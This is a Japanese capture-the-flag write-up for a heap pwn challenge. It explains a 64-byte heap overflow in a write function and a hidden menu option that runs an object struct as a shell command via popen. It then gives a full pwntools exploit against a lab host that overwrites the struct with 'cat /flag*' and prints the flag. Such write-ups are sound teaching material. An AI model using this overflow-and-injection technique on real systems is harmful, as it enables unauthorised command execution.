# 記憶の侵食 - Writeup

## 問題概要

動的にメモリを管理し、オブジェクトの割り当て・解放・操作を行うシンプルなサービスがあります。メモリレイアウトを理解し、適切な攻撃手法を組み合わせることで、システムの制御を奪取する問題です。

## バイナリ解析

### ファイル情報

```
heap: ELF 64-bit LSB pie executable, x86-64, static-pie linked, with debug_info, not stripped
```

### 主要な関数

- `alloc_a` / `alloc_b`: オブジェクトA/Bを確保
- `free_a` / `free_b`: オブジェクトA/Bを解放
- `write_a`: オブジェクトAのデータバッファに書き込み
- `show_a` / `show_b`: オブジェクトA/Bの情報を表示
- `execute_callback_b`: 隠しメニュー（オプション9）- オブジェクトBのコールバックを実行
- `debug_function`: `/bin/sh`を実行するシェル関数

### メニューオプション

1. Allocate A
2. Allocate B
3. Free A
4. Free B
5. Write A
6. Show A
7. Show B
8. Exit
9. **Execute callback B** (隠しメニュー)

## 脆弱性の発見

### 1. ヒープバッファオーバーフロー

`write_a`関数は、ユーザーが指定したサイズ + 64バイト（0x40）を読み取ります：

```c
read(0, object_a->data_buffer, object_a->size + 0x40);
```

これにより、**64バイトのオーバーフロー**が可能です。

### 2. execute_callback_bの動作

`execute_callback_b`関数は以下のように動作します：

```c
if (object_b != NULL && object_b->callback != NULL) {
    popen((char*)object_b, "r");  // object_b自体をコマンドとして実行！
    // もしpopenが失敗したら: system((char*)object_b);
}
```

重要な点：`object_b->callback`がNULLでないかチェックした後、**object_b構造体自体**をコマンド文字列として`popen`/`system`に渡します。

### オブジェクト構造体

```c
struct object {
    char* name;           // +0x00
    char* data_buffer;    // +0x08
    size_t size;          // +0x10
    void* callback;       // +0x18 (execute_callback_bで非NULLチェック)
    int type;             // +0x20
};  // total: 0x28 bytes
```

## 攻撃手法

### メモリレイアウトの操作

1. **オブジェクトAを確保** (サイズ 0x30)
2. **オブジェクトBを確保** (サイズ 0x10)

これにより、ヒープ上で以下のレイアウトが作成されます：

```
[Object A struct] [Object A name] [Object A data] [Object B struct] [Object B name] [Object B data]
```

重要なのは、**Object A の data** と **Object B の struct** の距離です。
私の場合、オフセットは**0x40バイト (64バイト)**でした。

### オーバーフローによる上書き

`write_a`で書き込めるバイト数：

- object_a->size = 0x30
- 実際に読み取る量 = 0x30 + 0x40 = 0x70バイト

offset=0x40で、**ちょうどobject_B構造体に到達可能**です！

### ペイロード構造

```python
payload = b'A' * 0x40        # padding to reach object_b
payload += b'cat /flag*'     # コマンド（object_bの先頭に配置）
payload += b'\x00' * padding # NULL終端とアライメント
payload += p64(1)            # offset 0x18: callback (非NULLにする必要あり)
```

## 攻撃の流れ

1. **Allocate A (size=0x30)**: オブジェクトAを作成
2. **Show A**: Data Aのアドレスを取得
3. **Allocate B (size=0x10)**: オブジェクトBを作成（Aの後に配置）
4. **Show B**: Object Bのアドレスを取得、PIEベースをリーク
5. **Write A**: オーバーフローを利用してobject_Bを上書き
   - object_Bの先頭に `cat /flag*` を配置
   - offset 0x18のcallbackを非NULLに設定
6. **Execute callback B (option 9)**:
   - `popen((char*)object_b, "r")` が実行される
   - object_bは今 `cat /flag*` という文字列を指している
   - フラグが出力される！

## Exploitコード

```python
#!/usr/bin/env python3
from pwn import *

HOST = '10.2.0.5'
PORT = 10004

def alloc_a(io, size, name=b'AAAA'):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Object size', str(size).encode())
    io.sendlineafter(b'Object name', name)

def alloc_b(io, size, name=b'BBBB'):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Object size', str(size).encode())
    io.sendlineafter(b'Object name', name)

def write_a(io, data):
    io.sendlineafter(b'> ', b'5')
    io.sendafter(b':', data)

def show_a(io):
    io.sendlineafter(b'> ', b'6')
    return io.recvuntil(b'================')

def show_b(io):
    io.sendlineafter(b'> ', b'7')
    return io.recvuntil(b'================')

def execute_callback_b(io):
    io.sendlineafter(b'> ', b'9')

io = remote(HOST, PORT)

# Step 1-2: Allocate A and get addresses
alloc_a(io, 0x30, b'AAAA')
data = show_a(io)
data_a_addr = int(re.search(rb'Data address:\s*(0x[0-9a-fA-F]+)', data).group(1), 16)

# Step 3-4: Allocate B and get addresses
alloc_b(io, 0x10, b'BBBB')
data = show_b(io)
object_b_addr = int(re.search(rb'Object address:\s*(0x[0-9a-fA-F]+)', data).group(1), 16)

# Calculate offset
offset = object_b_addr - data_a_addr  # Should be 0x40

# Step 5: Write payload with overflow
cmd = b'cat /flag*'
payload = b'A' * offset
payload += cmd
payload += b'\x00' * (0x18 - len(cmd))  # padding to callback
payload += p64(1)  # non-null callback

write_a(io, payload + b'\n')

# Step 6: Execute callback to get flag
execute_callback_b(io)

io.interactive()
```

## フラグ

```
flag{h34p_0v3rfl0w_m4st3r_pwn3d}
```

## まとめ

この問題は以下の脆弱性を組み合わせて解きました：

1. **ヒープバッファオーバーフロー**: `write_a`がsize+64バイトを読み取る
2. **隠し機能の発見**: option 9の`execute_callback_b`
3. **コマンドインジェクション**: `execute_callback_b`がobject_b自体をコマンドとして実行

ヒープレイアウトを理解し、オーバーフローでobject_Bの内容を任意のコマンドに書き換えることで、シェルコマンドを実行できました。
